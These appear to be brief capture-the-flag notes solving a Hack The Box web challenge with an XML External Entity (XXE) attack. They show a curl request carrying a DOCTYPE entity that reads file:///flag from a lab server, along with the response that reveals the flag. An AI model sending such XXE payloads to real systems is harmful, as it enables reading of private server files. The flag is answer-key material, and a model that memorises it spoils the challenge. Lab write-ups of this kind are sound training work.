'''
#https://nxtdaemon.xyz/htb-baby-waffles-order-web/?utm_source=rss&utm_medium=rss&utm_campaign=htb-baby-waffles-order-web
#xxe
#XML External Entity (XXE) Processing
#https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing


curl -X POST -H "Content-Type: application/xml" -d '<order><food>Pizza</food></order>' http://94.237.54.50:50978/api/order
Your Pizza order has been submitted successfully.

curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE replace [ <!ENTITY Flag SYSTEM "file:///flag" > ]><order><food>&Flag;</food></order>' http://94.237.54.50:50978/api/order
Your HTB{wh0_l3t_th3_XX3_0ut??w00f..w00f..w00f..WAFfles!} order has been submitted successfully.
'''
